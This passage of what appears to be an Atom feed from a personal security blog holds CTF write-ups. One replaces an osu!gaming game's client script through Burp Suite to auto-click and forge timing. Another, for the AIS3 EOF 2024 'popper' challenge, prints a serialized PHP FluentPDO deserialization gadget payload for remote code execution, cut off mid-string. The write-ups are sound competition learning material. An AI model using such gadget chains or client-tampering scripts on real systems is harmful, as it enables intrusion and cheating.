class="string">"block"</span>;</span><br><span class="line">    $(<span class="string">"#gameId"</span>).<span class="property">innerText</span> = <span class="string">`Game ID: <span class="subst">${session.gameId}</span>`</span>;</span><br><span class="line">    $(<span class="string">"#gameURL"</span>).<span class="property">innerText</span> = location.<span class="property">origin</span> + <span class="string">"/?id="</span> + session.<span class="property">gameId</span>;</span><br><span class="line">    $(<span class="string">"#gameURL"</span>).<span class="property">href</span> = <span class="string">"/?id="</span> + session.<span class="property">gameId</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (session.<span class="property">host</span> === username) {</span><br><span class="line">      $(<span class="string">"#start-btn"</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">"block"</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#users"</span>).<span class="property">innerHTML</span> = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> user <span class="keyword">of</span> session.<span class="property">users</span>) {</span><br><span class="line">      <span class="keyword">const</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">"li"</span>);</span><br><span class="line">      li.<span class="property">innerText</span> = user;</span><br><span class="line">      $(<span class="string">"#users"</span>).<span class="title function_">appendChild</span>(li);</span><br><span class="line">    }</span><br><span class="line">  } <span class="keyword">else</span> <span class="keyword">if</span> (type === <span class="string">"game"</span>) {</span><br><span class="line">    session = data;</span><br><span class="line">    <span class="title function_">run</span>(session);</span><br><span class="line">  } <span class="keyword">else</span> <span class="keyword">if</span> (type === <span class="string">"results"</span>) {</span><br><span class="line">    session = data;</span><br><span class="line">    $(<span class="string">"#results"</span>).<span class="property">innerHTML</span> = <span class="string">""</span>;</span><br><span class="line">    $(<span class="string">"#message"</span>).<span class="property">innerHTML</span> =</span><br><span class="line">      session.<span class="property">round</span> &lt; session.<span class="property">songs</span>.<span class="property">length</span> - <span class="number">1</span></span><br><span class="line">        ? <span class="string">"The next round will start soon..."</span></span><br><span class="line">        : <span class="string">""</span>;</span><br><span class="line">    $(<span class="string">"#gameURL"</span>).<span class="property">parentElement</span>.<span class="property">style</span>.<span class="property">display</span> = <span class="string">"none"</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; session.<span class="property">results</span>.<span class="property">length</span>; i++) {</span><br><span class="line">      <span class="keyword">const</span> h5 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">"h5"</span>);</span><br><span class="line">      h5.<span class="property">innerText</span> = <span class="string">`Song #<span class="subst">${i + <span class="number">1</span>}</span> / <span class="subst">${session.songs.length}</span>: <span class="subst">${session.songs[i].name}</span> (<span class="subst">${session.songs[i].bpm}</span> BPM)`</span>;</span><br><span class="line">      $(<span class="string">"#results"</span>).<span class="title function_">appendChild</span>(h5);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> ol = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">"ol"</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; session.<span class="property">results</span>[i].<span class="property">length</span>; j++) {</span><br><span class="line">        <span class="keyword">const</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">"li"</span>);</span><br><span class="line">        li.<span class="property">innerText</span> = <span class="string">`<span class="subst">${session.results[i][j].username}</span> - <span class="subst">${session.results[i][j].bpm.toFixed(<span class="number">2</span>)}</span> BPM | <span class="subst">${session.results[i][j].ur.toFixed(<span class="number">2</span>)}</span> UR`</span>;</span><br><span class="line">        <span class="keyword">if</span> (j === <span class="number">0</span>) li.<span class="property">innerText</span> += <span class="string">" 🏆"</span>;</span><br><span class="line">        ol.<span class="title function_">appendChild</span>(li);</span><br><span class="line">      }</span><br><span class="line">      $(<span class="string">"#results"</span>).<span class="title function_">appendChild</span>(ol);</span><br><span class="line">    }</span><br><span class="line">  } <span class="keyword">else</span> <span class="keyword">if</span> (type === <span class="string">"message"</span>) {</span><br><span class="line">    $(<span class="string">"#message"</span>).<span class="property">innerText</span> = data;</span><br><span class="line">  } <span class="keyword">else</span> <span class="keyword">if</span> (type === <span class="string">"error"</span>) {</span><br><span class="line">    <span class="title function_">alert</span>(data);</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> clicks = <span class="keyword">new</span> <span class="title class_">Set</span>(),</span><br><span class="line">  pressed = [],</span><br><span class="line">  recording = <span class="literal">false</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> {</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    (e.<span class="property">key</span> === $(<span class="string">"#key1"</span>).<span class="property">value</span> || e.<span class="property">key</span> == $(<span class="string">"#key2"</span>).<span class="property">value</span>) &amp;&amp;</span><br><span class="line">    recording &amp;&amp;</span><br><span class="line">    !pressed.<span class="title function_">includes</span>(e.<span class="property">key</span>)</span><br><span class="line">  ) {</span><br><span class="line">    pressed.<span class="title function_">push</span>(e.<span class="property">key</span>);</span><br><span class="line">    clicks.<span class="title function_">add</span>(performance.<span class="title function_">now</span>());</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeyup</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> {</span><br><span class="line">  pressed = pressed.<span class="title function_">filter</span>(<span class="function">(<span class="params">p</span>) =&gt;</span> p !== e.<span class="property">key</span>);</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">fadeOut</span> = (<span class="params">audio</span>) =&gt; {</span><br><span class="line">  <span class="keyword">if</span> (audio.<span class="property">volume</span> &gt; <span class="number">0</span>) {</span><br><span class="line">    audio.<span class="property">volume</span> -= <span class="number">0.01</span>;</span><br><span class="line">    timer = <span class="built_in">setTimeout</span>(fadeOut, <span class="number">100</span>, audio);</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// algorithm from https://ckrisirkc.github.io/osuStreamSpeed.js/newmain.js</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">calculate</span> = (<span class="params">start, end, clicks</span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> clickArr = [...clicks];</span><br><span class="line">  <span class="keyword">const</span> bpm =</span><br><span class="line">    <span class="title class_">Math</span>.<span class="title function_">round</span>((((clickArr.<span class="property">length</span> / (end - start)) * <span class="number">60000</span>) / <span class="number">4</span>) * <span class="number">100</span>) / <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">const</span> deltas = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; clickArr.<span class="property">length</span> - <span class="number">1</span>; i++) {</span><br><span class="line">    deltas.<span class="title function_">push</span>(clickArr[i + <span class="number">1</span>] - clickArr[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">const</span> deltaAvg = deltas.<span class="title function_">reduce</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b, <span class="number">0</span>) / deltas.<span class="property">length</span>;</span><br><span class="line">  <span class="keyword">const</span> variance = deltas</span><br><span class="line">    .<span class="title function_">map</span>(<span class="function">(<span class="params">v</span>) =&gt;</span> (v - deltaAvg) * (v - deltaAvg))</span><br><span class="line">    .<span class="title function_">reduce</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> stdev = <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(variance / deltas.<span class="property">length</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> { <span class="attr">bpm</span>: bpm || <span class="number">0</span>, <span class="attr">ur</span>: stdev * <span class="number">10</span> || <span class="number">0</span> };</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// scoring algorithm</span></span><br><span class="line"><span class="comment">// first judge by whoever has round(bpm) closest to target bpm, if there is a tie, judge by lower UR</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">session.results[session.round] = session.results[session.round].sort((a, b) =&gt; {</span></span><br><span class="line"><span class="comment">    const bpmDeltaA = Math.abs(Math.round(a.bpm) - session.songs[session.round].bpm);</span></span><br><span class="line"><span class="comment">    const bpmDeltaB = Math.abs(Math.round(b.bpm) - session.songs[session.round].bpm);</span></span><br><span class="line"><span class="comment">    if (bpmDeltaA !== bpmDeltaB) return bpmDeltaA - bpmDeltaB;</span></span><br><span class="line"><span class="comment">    return a.ur - b.ur</span></span><br><span class="line"><span class="comment">});</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sleep</span> = (<span class="params">ms</span>) =&gt; <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> <span class="built_in">setTimeout</span>(r, ms));</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">run</span> = <span class="keyword">async</span> (<span class="params">session</span>) =&gt; {</span><br><span class="line">  clicks.<span class="title function_">clear</span>();</span><br><span class="line">  $(<span class="string">"#lobby"</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">"none"</span>;</span><br><span class="line">  $(<span class="string">"#game"</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">"block"</span>;</span><br><span class="line">  $(<span class="string">"#bpm"</span>).<span class="property">innerText</span> = <span class="string">`BPM: 0`</span>;</span><br><span class="line">  $(<span class="string">"#ur"</span>).<span class="property">innerText</span> = <span class="string">`UR: 0`</span>;</span><br><span class="line"></span><br><span class="line">  $(<span class="string">"#song"</span>).<span class="property">innerText</span> =</span><br><span class="line">    <span class="string">`Song #<span class="subst">${session.round + <span class="number">1</span>}</span> / <span class="subst">${session.songs.length}</span>: <span class="subst">${session.songs[session.round].name}</span> (<span class="subst">${session.songs[session.round].bpm}</span> BPM)`</span>;</span><br><span class="line">  <span class="keyword">const</span> audio = <span class="keyword">new</span> <span class="title class_">Audio</span>(<span class="string">`songs/<span class="subst">${session.songs[session.round].file}</span>`</span>);</span><br><span class="line">  audio.<span class="property">volume</span> = <span class="number">0.1</span>;</span><br><span class="line">  audio.<span class="property">currentTime</span> = session.<span class="property">songs</span>[session.<span class="property">round</span>].<span class="property">startOffset</span>;</span><br><span class="line">  <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> (audio.<span class="property">oncanplaythrough</span> = r));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">5</span>; i &gt;= <span class="number">1</span>; i--) {</span><br><span class="line">    $(<span class="string">"#timer"</span>).<span class="property">innerText</span> = <span class="string">`Song starting in <span class="subst">${i}</span>...`</span>;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">1000</span>);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> timer = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">    $(<span class="string">"#timer"</span>).<span class="property">innerText</span> =</span><br><span class="line">      <span class="string">`Time remaining: <span class="subst">${(session.songs[session.round].duration - (audio.currentTime - session.songs[session.round].startOffset)).toFixed(<span class="number">2</span>)}</span>s`</span>;</span><br><span class="line">  }, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">  audio.<span class="title function_">play</span>();</span><br><span class="line">  <span class="comment">// delay to start tapping</span></span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">let</span> start = +<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">  recording = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// delay to collect initial samples</span></span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="keyword">while</span> (</span><br><span class="line">    audio.<span class="property">currentTime</span> - session.<span class="property">songs</span>[session.<span class="property">round</span>].<span class="property">startOffset</span> &lt;</span><br><span class="line">    session.<span class="property">songs</span>[session.<span class="property">round</span>].<span class="property">duration</span></span><br><span class="line">  ) {</span><br><span class="line">    <span class="keyword">const</span> { bpm, ur } = <span class="title function_">calculate</span>(start, +<span class="keyword">new</span> <span class="title class_">Date</span>(), clicks);</span><br><span class="line">    $(<span class="string">"#bpm"</span>).<span class="property">innerText</span> = <span class="string">`BPM: <span class="subst">${bpm.toFixed(<span class="number">2</span>)}</span>`</span>;</span><br><span class="line">    $(<span class="string">"#ur"</span>).<span class="property">innerText</span> = <span class="string">`UR: <span class="subst">${ur.toFixed(<span class="number">2</span>)}</span>`</span>;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">50</span>);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> end = +<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">  recording = <span class="literal">false</span>;</span><br><span class="line">  $(<span class="string">"#timer"</span>).<span class="property">innerText</span> = <span class="string">`Time remaining: 0s`</span>;</span><br><span class="line">  <span class="title function_">fadeOut</span>(audio);</span><br><span class="line">  <span class="built_in">clearInterval</span>(timer);</span><br><span class="line"></span><br><span class="line">  ws.<span class="title function_">send</span>(</span><br><span class="line">    <span class="title class_">JSON</span>.<span class="title function_">stringify</span>({</span><br><span class="line">      <span class="attr">type</span>: <span class="string">"results"</span>,</span><br><span class="line">      <span class="attr">data</span>: { <span class="attr">clicks</span>: [...clicks], start, end },</span><br><span class="line">    }),</span><br><span class="line">  );</span><br><span class="line">  $(<span class="string">"#message"</span>).<span class="property">innerText</span> = <span class="string">"Waiting for others to finish..."</span>;</span><br><span class="line">  $(<span class="string">"#game"</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">"none"</span>;</span><br><span class="line">  $(<span class="string">"#lobby"</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">"block"</span>;</span><br><span class="line">};</span><br></pre></td></tr></table></figure></div><h4 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h4><p>I replaced the <code>stream-vs.js</code> with my own version using Burp Suite.</p><p><img src="/osu-gaming-ctf-2024-write-up/burp-replace.webp" alt="burp-replace"></p><p>In my <code>stream-vs.js</code>, I use JavaScript to play the game for me.</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">click</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">dispatchEvent</span>(<span class="keyword">new</span> <span class="title class_">KeyboardEvent</span>(<span class="string">"keydown"</span>, { <span class="attr">key</span>: <span class="string">"x"</span> }));</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">dispatchEvent</span>(<span class="keyword">new</span> <span class="title class_">KeyboardEvent</span>(<span class="string">"keyup"</span>, { <span class="attr">key</span>: <span class="string">"x"</span> }));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getClickInterval</span>(<span class="params">bpm, duration</span>) {</span><br><span class="line">  <span class="comment">// bpm = Math.round(((clickArr.length / (end - start) * 60000)/4) * 100) / 100;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">60</span> / bpm / <span class="number">4</span> + <span class="number">0.0003</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">startClicking</span>(<span class="params">bpm, duration</span>) {</span><br><span class="line">  <span class="keyword">let</span> interval = <span class="title function_">getClickInterval</span>(bpm, duration * <span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">let</span> timer = <span class="built_in">setInterval</span>(click, interval * <span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="built_in">clearInterval</span>(timer), duration * <span class="number">1000</span> + <span class="number">10000</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><p>The <code>startClicking</code> function will be called at the beginning of each round. At the end of each round, <code>end</code> will be adjusted so the <code>bpm</code> will become exact.</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">run</span> = <span class="keyword">async</span> (<span class="params">session</span>) =&gt; {</span><br><span class="line">  <span class="comment">// [...]</span></span><br><span class="line">  <span class="keyword">const</span> timer = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">    $(<span class="string">"#timer"</span>).<span class="property">innerText</span> =</span><br><span class="line">      <span class="string">`Time remaining: <span class="subst">${(session.songs[session.round].duration - (audio.currentTime - session.songs[session.round].startOffset)).toFixed(<span class="number">2</span>)}</span>s`</span>;</span><br><span class="line">  }, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">startClicking</span>(round_bmp, round_duration + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  audio.<span class="title function_">play</span>();</span><br><span class="line">  <span class="comment">// [...]</span></span><br><span class="line">  <span class="keyword">while</span> (</span><br><span class="line">    audio.<span class="property">currentTime</span> - session.<span class="property">songs</span>[session.<span class="property">round</span>].<span class="property">startOffset</span> &lt;</span><br><span class="line">    session.<span class="property">songs</span>[session.<span class="property">round</span>].<span class="property">duration</span></span><br><span class="line">  ) {</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">// make end so that the bpm becomes the same as the target bpm</span></span><br><span class="line">  <span class="keyword">let</span> end = start + ((clicks.<span class="property">size</span> / round_bmp) * <span class="number">60</span> * <span class="number">1000</span>) / <span class="number">4</span>;</span><br><span class="line">  recording = <span class="literal">false</span>;</span><br><span class="line">  $(<span class="string">"#timer"</span>).<span class="property">innerText</span> = <span class="string">`Time remaining: 0s`</span>;</span><br><span class="line">  <span class="comment">// [...]</span></span><br><span class="line">};</span><br></pre></td></tr></table></figure></div><img src="/osu-gaming-ctf-2024-write-up/stream-vs-res.webp" style="width: min(28em, 100%);">]]></content>
    
    
    <summary type="html">I participated in [osu!gaming CTF](https://ctf.osugaming.lol/)  with [TakeKitsune](https://ctftime.org/team/280959), and here is my write-up of the part I solved.</summary>
    
    
    
    
    <category term="ctf" scheme="https://blog.ching367436.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>EDU CTF 2022 Write-up</title>
    <link href="https://blog.ching367436.me/edu-ctf-2022-write-up/"/>
    <id>https://blog.ching367436.me/edu-ctf-2022-write-up/</id>
    <published>2024-02-12T02:29:55.000Z</published>
    <updated>2024-02-12T02:29:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>我 2022 大一的時候來修交大資科工碩開的程式安全, 是唯一大學部 A+ 的人. 這門課在臺大課名叫 計算機安全, 台科大叫 資訊安全實務, 課程網站叫 edu-ctf.</p><h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h2><p>Web I: <a class="link" href="https://hackmd.io/@Ching367436/Sks-wCIwo">https://hackmd.io/@Ching367436/Sks-wCIwo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Web II: <a class="link" href="https://hackmd.io/@Ching367436/Byr2Nzxds">https://hackmd.io/@Ching367436/Byr2Nzxds <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Web III: <a class="link" href="https://hackmd.io/@Ching367436/r1w_xLFdo">https://hackmd.io/@Ching367436/r1w_xLFdo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>Crypto I+II: <a class="link" href="https://hackmd.io/@Ching367436/HJezkWi-s">https://hackmd.io/@Ching367436/HJezkWi-s <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Crypto III: <a class="link" href="https://hackmd.io/@Ching367436/rkdIg6mVo">https://hackmd.io/@Ching367436/rkdIg6mVo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>Reverse I: <a class="link" href="https://hackmd.io/@Ching367436/ByMnL1lNj">https://hackmd.io/@Ching367436/ByMnL1lNj <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Reverse II: <a class="link" href="https://hackmd.io/@Ching367436/rJOYq0JNs">https://hackmd.io/@Ching367436/rJOYq0JNs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Reverse III: <a class="link" href="https://hackmd.io/@Ching367436/BkzXrlMHi">https://hackmd.io/@Ching367436/BkzXrlMHi <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>Pwn I: <a class="link" href="https://hackmd.io/@Ching367436/SJFNuWDri">https://hackmd.io/@Ching367436/SJFNuWDri <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Pwn II: <a class="link" href="https://hackmd.io/@Ching367436/rJzc1UiIi">https://hackmd.io/@Ching367436/rJzc1UiIi <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Pwn III: <a class="link" href="https://hackmd.io/@Ching367436/rJgEPl5wj">https://hackmd.io/@Ching367436/rJgEPl5wj <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
    <summary type="html">EDU CTF / 程式安全 / 計算機安全 / 資訊安全實務 2022 的 write-up.</summary>
    
    
    
    <category term="edu-ctf" scheme="https://blog.ching367436.me/categories/edu-ctf/"/>
    
    
    <category term="edu-ctf" scheme="https://blog.ching367436.me/tags/edu-ctf/"/>
    
    <category term="程式安全" scheme="https://blog.ching367436.me/tags/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8/"/>
    
    <category term="計算機安全" scheme="https://blog.ching367436.me/tags/%E8%A8%88%E7%AE%97%E6%A9%9F%E5%AE%89%E5%85%A8/"/>
    
    <category term="資訊安全實務" scheme="https://blog.ching367436.me/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8%E5%AF%A6%E5%8B%99/"/>
    
  </entry>
  
  <entry>
    <title>AIS3 EOF 2024 Final</title>
    <link href="https://blog.ching367436.me/ais3-eof-2024-final/"/>
    <id>https://blog.ching367436.me/ais3-eof-2024-final/</id>
    <published>2024-02-05T13:27:31.000Z</published>
    <updated>2024-02-05T13:27:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文將包含我有看的題目、賽前準備以及團隊分工的心得, 由於大部分隊友都不認識, 而且一隊有 8 人, 在這種情況下團隊分工會是很大的挑戰, 也在這次體驗到各種很壞的團隊分工, 光是團隊分工就可以讓我們排名在第一天就掉到倒數第二, 我在當晚匯集隊友重新調整, 在第二天第 140 回合就衝到了前三. 這經驗對於我未來的團隊管理會有很大的幫助.</p><p>另外這次共有 5 題, 其中 4 題最需要的都是 web, 只有一題是 pwn, 然後我這隊只有我 &amp; ywc 是打 web 的..</p><h2 id="popper-KoH"><a href="#popper-KoH" class="headerlink" title="popper [KoH]"></a>popper [KoH]</h2><p>Author: splitline</p><h3 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h3><div class="highlight-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">TL;DR: 找到網路上隨便一個 composer package 裡的反序列化 RCE gadget，越好用+越短越好。</span><br><span class="line"></span><br><span class="line">你可以安裝任意一個存在的 composer package，目標是找到一個能執行任意 function 的反序列化 gadget</span><br><span class="line"></span><br><span class="line">你需要使用 p0pp3r<span class="emphasis">_win function 來執行 ./@ --give-me-flag 指令</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">只有 p0pp3r_</span>win 是有效的目標，其他任何的 function 都不會被計分系統接受，就算其能成功達成 RCE</span><br><span class="line"></span><br><span class="line">你的 payload 中必須至少使用到一個直接屬於 package 的 namespace 裡的 class（根據 psr-0、psr-4 判斷）</span><br><span class="line"></span><br><span class="line">對於每一個 package，只會存在一個最佳 gadget 能獲得分數，比較順位如下：</span><br><span class="line"></span><br><span class="line">Gadget 依賴條件：毋需條件 &gt; <span class="strong">__toString &gt; __</span>call</span><br><span class="line"></span><br><span class="line">Payload 長度：短的可以取代長的</span><br><span class="line"></span><br><span class="line">Package 星星數越多，其價值分數越高</span><br><span class="line"></span><br><span class="line">分數計算以執行完成的時刻為準，而非提交時間；若一個 payload 尚未執行完畢，無法嘗試第二個</span><br><span class="line"></span><br><span class="line">一律安裝「2024/2/3 10:00 UTC+8 前」釋出的最新一個版本</span><br><span class="line"></span><br><span class="line">執行環境為 docker 映像 php:cli，原始碼大致上如下：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">require 'vendor/autoload.php';</span><br><span class="line">function p0pp3r<span class="emphasis">_win($command) {</span></span><br><span class="line"><span class="emphasis">  system($command);</span></span><br><span class="line"><span class="emphasis">}</span></span><br><span class="line"><span class="emphasis">unserialize(PAYLOAD);</span></span><br></pre></td></tr></table></figure></div><h3 id="比賽情況"><a href="#比賽情況" class="headerlink" title="比賽情況"></a>比賽情況</h3><p>看到這種題目一定就會想拿 PHPGGC 直接炸下去🍤, 所以題目作者就在 -1 回合的時候就用 NPC 隊把他生的 payload 全部都用上去, 請 AxelHowe (打 pwn 的) 跟 Ching367436 幫忙試才發現的, 接著 Ching367436 看到 PHPGGC 有 <a class="link" href="https://github.com/ambionics/phpggc/pull/160">pr <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, 裡面有其他原本沒有的, 發現全部都不行, 後來有隊伍拿 edu-ctf 的 chain 來打 (predis), 就待在排名上面一直拿分, 第一天那題就沒有動靜了</p><p>第二天清晨, 我在 <a class="link" href="https://packagist.org/explore/popular">https://packagist.org/explore/popular <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 逛了各種熱門的 composer 的 app. 基本上流程就是把 package 載下來, 找 php magic method, 找不到就刪掉換下一個, 發現其實 <code>__destruct</code> 還蠻稀有的, 後來翻到 <a class="link" href="https://packagist.org/explore/popular?query=FluentPDO">https://packagist.org/explore/popular?query=FluentPDO <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> , 然後 splitline 那邊有<a class="link" href="https://github.com/splitline/My-CTF-Challenges/tree/master/tsj-ctf/avatar">現成的 chain <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 可用, 拿來改成可以用的形狀後, 我把一個 chain 當 3 個來用, 因為 <code>envms/fluentpdo</code> <code>lichtner/fluentpdo</code> <code>fpdo/fluentpdo</code> 都是同個東西, 所以就用這個拿 3 倍的分數, 靠這個就在這題第一名待了幾個小時, 後來被抄走了 ==.</p><h4 id="各種縮短-POP-Chain-的手法"><a href="#各種縮短-POP-Chain-的手法" class="headerlink" title="各種縮短 POP Chain 的手法"></a>各種縮短 POP Chain 的手法</h4><p>第一種就是直接找其他更短的 chain, 但時間成本較高. 我在 <code>fluentpdo</code> 被搶走後採用的是: 在生 chain 的過程把所有 <code>private</code> <code>protected</code> 的部分改成 <code>public</code>, 這樣可以少一些 <code>\x00</code>  如下:</p><p><img src="/ais3-eof-2024-final/poper-public.webp"></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># before</span></span><br><span class="line"><span class="string">b'O:30:"Envms\\FluentPDO\\Queries\\Select":3:{s:9:"\x00*\x00fluent";O:21:"Envms\\FluentPDO\\Query":1:{s:32:"\x00Envms\\FluentPDO\\Query\x00structure";O:25:"Envms\\FluentPDO\\Structure":1:{s:37:"\x00Envms\\FluentPDO\\Structure\x00primaryKey";s:10:"p0pp3r_win";}}s:8:"\x00*\x00regex";O:21:"Envms\\FluentPDO\\Regex":0:{}s:13:"\x00*\x00statements";a:2:{s:8:"GROUP 